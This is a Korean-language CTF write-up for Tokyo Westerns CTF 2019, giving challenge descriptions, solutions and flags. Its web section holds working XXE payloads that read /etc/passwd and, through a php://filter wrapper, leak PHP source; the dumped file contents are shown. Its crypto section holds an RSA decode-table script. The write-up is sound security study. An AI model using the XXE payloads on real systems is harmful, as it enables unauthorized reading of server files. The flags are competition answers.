# Tokyo Westerns CTF 5th 2019
with team `g0pher`. (157 / 1288)  

## Misc
Welcome!!(23pt)

## Web
j2x2j(59pt)

## Crypto
real-baby-rsa(40pt)

## Reverse
Easy Crack Me(88pt)

## Pwn
nothing more to say(78pt)


# Welcome!!
## Problem
The flag is TWCTF{Welcome_to_TWCTF_2019!!!}.

## Flag
`TWCTF{Welcome_to_TWCTF_2019!!!}`

# j2x2j
## Problem
[Here](http://j2x2j.chal.ctf.westerns.tokyo/) is useful tool for you.

## Play
주어진 링크에 접속하면 `JSON to XML`와 `XML to JSON` 기능이 있는 홈페이지가 뜬다. 아래와 같이 동작한다.
```json
{
    "glossary": {
        "title": "example glossary",
        "GlossDiv": {
            "title": "S",
            "GlossList": {
                "GlossEntry": {
                    "ID": "SGML",
                    "SortAs": "SGML",
                    "GlossTerm": "Standard Generalized Markup Language",
                    "Acronym": "SGML",
                    "Abbrev": "ISO 8879:1986",
                    "GlossDef": {
                        "para": "A meta-markup language, used to create markup languages such as DocBook.",
                        "GlossSeeAlso": ["GML", "XML"]
                    },
                    "GlossSee": "markup"
                }
            }
        }
    }
}
```
```XML
<?xml version="1.0"?>
<root>
  <glossary>
    <title>example glossary</title>
    <GlossDiv>
      <title>S</title>
      <GlossList>
        <GlossEntry>
          <ID>SGML</ID>
          <SortAs>SGML</SortAs>
          <GlossTerm>Standard Generalized Markup Language</GlossTerm>
          <Acronym>SGML</Acronym>
          <Abbrev>ISO 8879:1986</Abbrev>
          <GlossDef>
            <para>A meta-markup language, used to create markup languages such as DocBook.</para>
            <GlossSeeAlso>GML</GlossSeeAlso>
            <GlossSeeAlso>XML</GlossSeeAlso>
          </GlossDef>
          <GlossSee>markup</GlossSee>
        </GlossEntry>
      </GlossList>
    </GlossDiv>
  </glossary>
</root>
```
위와 같이 두 코드는 서로 변환되는 같은 코드다. XML을 JSON으로 변환하는 과정에서 XXE(XML eXternal Entities)로 LFI로 flag를 읽는것이 가능하다고 생각했다. 
``` XML
<?xml version="1.0"?>
<!DOCTYPE d [<!ENTITY e SYSTEM "/etc/passwd">]>
<root>&e;</root>
```
```json
{
    "0": "root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\nsshd:x:109:65534::\/run\/sshd:\/usr\/sbin\/nologin\npollinate:x:110:1::\/var\/cache\/pollinate:\/bin\/false\n_chrony:x:111:115:Chrony daemon,,,:\/var\/lib\/chrony:\/usr\/sbin\/nologin\nubuntu:x:1000:1000:Ubuntu:\/home\/ubuntu:\/bin\/bash\ntw:x:1001:1002::\/home\/tw:\/bin\/bash\ngoogle-fluentd:x:112:116::\/home\/google-fluentd:\/usr\/sbin\/nologin\n"
}
```
`/etc/passwd`를 XXE로 읽어낼 수 있었고, 현재 페이지인 `./index.php`를 읽어보려고 했으나 읽히지 않았다. 그래서 `php wrapper` 중 `php://`를 이용해서 index.php를 base64 인코딩 한 문자를 읽어들였다.
```xml
<?xml version="1.0"?>
<!DOCTYPE d [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=./index.php">]>
<root>&e;</root>
```
```json
{
    "0": "PD9waHAKaW5jbHVkZSAnZmxhZy5waHAnOwoKJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOwoKZnVuY3Rpb24gZGllNDA0KCRtc2cpIHsKICBodHRwX3Jlc3BvbnNlX2NvZGUoNDA0KTsKICBkaWUoJG1zZyk7Cn0KCmZ1bmN0aW9uIGNoZWNrX3R5cGUoJG9iaikgewogIGlmIChpc19hcnJheSgkb2JqKSkgewogICAgJGtleV9pc19zdHIgPSBmdW5jdGlvbigkb2JqKSB7CiAgICAgIGZvcmVhY2goJG9iaiBhcyAka2V5PT4kdmFsKSB7CiAgICAgICAgaWYgKGlzX2ludCgka2V5KSkKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgICByZXR1cm4gdHJ1ZTsKICAgIH07CiAgICAKICAgIGlmICgka2V5X2lzX3N0cigkb2JqKSkgewogICAgICByZXR1cm4gJ29iamVjdCc7CiAgICB9CiAgICBlbHNlIHsKICAgICAgcmV0dXJuICdhcnJheSc7CiAgICB9CiAgfQogIGVsc2UgewogICAgcmV0dXJuIGdldHR5cGUoJG9iaik7CiAgfQp9CgpmdW5jdGlvbiBqc29uMnhtbCgkb2JqKSB7CiAgJHJlcyA9ICcnOwogCiAgaWYgKGlzX2FycmF5KCRvYmopKSB7CiAgICBmb3JlYWNoKCRvYmogYXMgJGtleSA9PiAkdmFsKSB7CiAgICAgIHN3aXRjaChjaGVja190eXBlKCR2YWwpKSB7CiAgICAgICAgY2FzZSAnYXJyYXknOgogICAgICAgICAgZm9yZWFjaCgkdmFsIGFzICR2KSB7CiAgICAgICAgICAgICRyZXMgLj0gIjwka2V5PiI7CiAgICAgICAgICAgICRyZXMgLj0ganNvbjJ4bWwoJHYpOwogICAgICAgICAgICAkcmVzIC49ICI8LyRrZXk+IjsKICAgICAgICAgIH0KICAgICAgICAgIGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IC8vIG9iamVjdCBvciBwcmltaXRpdmUKICAgICAgICAgICRyZXMgLj0gIjwka2V5PiI7CiAgICAgICAgICAkcmVzIC49IGpzb24yeG1sKCR2YWwpOwogICAgICAgICAgJHJlcyAuPSAiPC8ka2V5PiI7CiAgICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogIH0KICBlbHNlIHsKICAgICRyZXMgPSAoc3RyaW5nKSRvYmo7CiAgfQogIHJldHVybiAkcmVzOwp9CgoKaWYgKCRtZXRob2QgPT09ICdQT1NUJykgewogICRqc29uc3RyID0gJF9QT1NUWydqc29uJ107CiAgJHhtbHN0ciA9ICRfUE9TVFsneG1sJ107CgogIGlmICghKGVtcHR5KCR4bWxzdHIpIF4gZW1wdHkoJGpzb25zdHIpKSkgewogICAgZGllNDA0KCc0MDQnKTsKICB9CgogIGlmICghZW1wdHkoJGpzb25zdHIpKSB7CiAgICAkb2JqID0ganNvbl9kZWNvZGUoJGpzb25zdHIsIHRydWUpOwogICAgaWYgKGVtcHR5KCRvYmopKSB7CiAgICAgIGRpZSgnZmFpbGVkIHRvIGRlY29kZSBqc29uJyk7CiAgICB9CiAgICAkZG9jID0gbmV3IERPTURvY3VtZW50KCcxLjAnKTsKICAgICRkb2MtPmZvcm1hdE91dHB1dCA9IHRydWU7CiAgICAkX29iaiA9IGFycmF5KCk7CiAgICAkX29ialsncm9vdCddID0gJG9iajsKICAgICRkb2MtPmxvYWRYTUwoanNvbjJ4bWwoJF9vYmopKTsKICAgIGVjaG8gJGRvYy0+c2F2ZVhNTCgpOwogIH0KCiAgaWYgKCFlbXB0eSgkeG1sc3RyKSkgewogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiAgICAkb2JqID0gc2ltcGxleG1sX2xvYWRfc3RyaW5nKCR4bWxzdHIsICdTaW1wbGVYTUxFbGVtZW50JywgTElCWE1MX05PRU5UKTsKICAgIGlmIChlbXB0eSgkb2JqKSkgewogICAgICBkaWUoJ2ZhaWxlZCB0byBkZWNvZGUgeG1sJyk7CiAgICB9CiAgICBlY2hvIGpzb25fZW5jb2RlKCRvYmosIEpTT05fUFJFVFRZX1BSSU5UKTsKICB9Cn0KZWxzZSB7Cj8+CjwhZG9jdHlwZSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDx0aXRsZT5KU09OIDwtPiBYTUwgQ29udmVydGVyPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8dGV4dGFyZWEgaWQ9Impzb24iIG5hbWU9Impzb24iIHJvd3M9IjUwIiBjb2xzPSI4MCI+CiAgICA8L3RleHRhcmVhPgoKICAgIDxpbnB1dCB0eXBlPSJidXR0b24iIGlkPSJ4MmoiIHZhbHVlPSI8LSIvPgogICAgPGlucHV0IHR5cGU9ImJ1dHRvbiIgaWQ9ImoyeCIgdmFsdWU9Ii0+Ii8+CgogICAgPHRleHRhcmVhIGlkPSJ4bWwiIG5hbWU9InhtbCIgcm93cz0iNTAiIGNvbHM9IjgwIj4KICAgIDwvdGV4dGFyZWE+CgogICAgPHNjcmlwdAogICAgICBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5taW4uanMiCiAgICAgIGludGVncml0eT0ic2hhMjU2LWh3ZzRnc3hnRlpoT3NFRWFtZE9ZR0JmMTNGeVF1aVR3bEFRZ3hWU05ndDQ9IgogICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICAgICQuZ2V0KCcvc2FtcGxlLmpzb24nLCBmdW5jdGlvbihkYXRhKSB7CiAgICAgICAgJCgnI2pzb24nKS52YWwoZGF0YSk7CiAgICAgIH0sICd0ZXh0Jyk7CgogICAgICAkKCcjajJ4Jykub24oJ2NsaWNrJywgZnVuY3Rpb24oKSB7CiAgICAgICAgJC5wb3N0KCcvJywgewogICAgICAgICAganNvbjogJCgnI2pzb24nKS52YWwoKQogICAgICAgIH0sIGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICQoJyN4bWwnKS52YWwoZGF0YSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwoKICAgICAgJCgnI3gyaicpLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewogICAgICAgICQucG9zdCgnLycsIHsKICAgICAgICAgIHhtbDogJCgnI3htbCcpLnZhbCgpCiAgICAgICAgfSwgZnVuY3Rpb24oZGF0YSkgewogICAgICAgICAgJCgnI2pzb24nKS52YWwoZGF0YSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgPC9zY3JpcHQ+CiAgPC9ib2R5Pgo8L2h0bWw+Cjw\/cGhwCn0K"
}
```
이를 복호화하면 아래와 같은 코드가 나온다.
``` php
<?php
include 'flag.php';

$method = $_SERVER['REQUEST_METHOD'];

function die404($msg) {
  http_response_code(404);
  die($msg);
}

function check_type($obj) {
  if (is_array($obj)) {
    $key_is_str = function($obj) {
      foreach($obj as $key=>$val) {
        if (is_int($key))
          return false;
      }
      return true;
    };
    
    if ($key_is_str($obj)) {
      return 'object';
    }
    else {
      return 'array';
    }
  }
  else {
    return gettype($obj);
  }
}

function json2xml($obj) {
  $res = '';
 
  if (is_array($obj)) {
    foreach($obj as $key => $val) {
      switch(check_type($val)) {
        case 'array':
          foreach($val as $v) {
            $res .= "<$key>";
            $res .= json2xml($v);
            $res .= "</$key>";
          }
          break;
        default: // object or primitive
          $res .= "<$key>";
          $res .= json2xml($val);
          $res .= "</$key>";
          break;
      }
    }
  }
  else {
    $res = (string)$obj;
  }
  return $res;
}


if ($method === 'POST') {
  $jsonstr = $_POST['json'];
  $xmlstr = $_POST['xml'];

  if (!(empty($xmlstr) ^ empty($jsonstr))) {
    die404('404');
  }

  if (!empty($jsonstr)) {
    $obj = json_decode($jsonstr, true);
    if (empty($obj)) {
      die('failed to decode json');
    }
    $doc = new DOMDocument('1.0');
    $doc->formatOutput = true;
    $_obj = array();
    $_obj['root'] = $obj;
    $doc->loadXML(json2xml($_obj));
    echo $doc->saveXML();
  }

  if (!empty($xmlstr)) {
    libxml_disable_entity_loader(false);
    $obj = simplexml_load_string($xmlstr, 'SimpleXMLElement', LIBXML_NOENT);
    if (empty($obj)) {
      die('failed to decode xml');
    }
    echo json_encode($obj, JSON_PRETTY_PRINT);
  }
}
else {
?>
<!doctype html>
<html>
  <head>
    <title>JSON <-> XML Converter</title>
  </head>
  <body>
    <textarea id="json" name="json" rows="50" cols="80">
    </textarea>

    <input type="button" id="x2j" value="<-"/>
    <input type="button" id="j2x" value="->"/>

    <textarea id="xml" name="xml" rows="50" cols="80">
    </textarea>

    <script
      src="https://code.jquery.com/jquery-3.2.1.min.js"
      integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
      crossorigin="anonymous"></script>
    <script>
      $.get('/sample.json', function(data) {
        $('#json').val(data);
      }, 'text');

      $('#j2x').on('click', function() {
        $.post('/', {
          json: $('#json').val()
        }, function(data) {
          $('#xml').val(data);
        });
      });

      $('#x2j').on('click', function() {
        $.post('/', {
          xml: $('#xml').val()
        }, function(data) {
          $('#json').val(data);
        });
      });
    </script>
  </body>
</html>
<?php
}
```
2번째 줄에 `include 'flag.php';`로 보아 flag.php가 존재함을 알 수 있고, 같은 방법으로 코드를 뽑아보면 아래와 같은 소스가 나온다.
``` php
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';
```

## Flag
`TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}`

# real-baby-rsa
## Problem
[real-baby-rsa.7z](https://score.ctf.westerns.tokyo/attachments/2/real-baby-rsa-037dd23e2f3b23038ee248487817bc1ad6636e1057e671826bea4e03a9acc79e.7z)

## Play
압축을 풀면 `problem.py`와 `output` 파일이 주어진다. 코드는 다음과 같다.  
``` python
flag = 'TWCTF{CENSORED}'

# Public Parameters
N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
e = 65537

# Encrypt the flag!
for char in flag:
    print(pow(ord(char), e, N))
```
flag라는 값이 있고, N과 e를 통해 정확히 `pow(ord(char), e, N)` 라는 로직을 통해 flag를 한글자씩 암호화 한다. 암호화 과정을 알고 있기 때문에 같은 방법으로 출력 가능한 문자를 암호화 해서 디코드 테이블을 만들 수 있다.
```python
import string

N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
e = 65537

# 모든 문자에 대한 디코드 테이블
decode_table = {}
for i in string.printable:
            decode_table[str(pow(ord(i),e,N))] = i
            

f = open("output","r")
lst = f.read().split("\n")

#디코드 테이블에서 해당 원본 문자를 복구
print("".join(decode_table[i] for i in lst))	
```

## Flag
`TWCTF{padding_is_important}`


#Easy Crack Me
## Problem
Cracking is easy for you.  

[easy_crack_me](https://score.ctf.westerns.tokyo/attachments/3/easy_crack_me-768bbdb6d3c597598d0f0c913941e4e3523af09bcfcff117f81e27158d783b3f)
## Play

## Flag


#nothing more to say
## Problem
Japan is fucking hot.  
  
nc nothing.chal.ctf.westerns.tokyo 10001  
  
[warmup.c](https://score.ctf.westerns.tokyo/attachments/4/warmup-324b473c61799a01c8b14f63c559ff408a9756a738198c5026735161a7608afa.c)  
[warmup](https://score.ctf.westerns.tokyo/attachments/4/warmup-b8fa17414a043a62ba16fdeb4f82051d35fc6f434f7130d6d988d6c2d312e73e)
## Play
ROP 문제
## Flag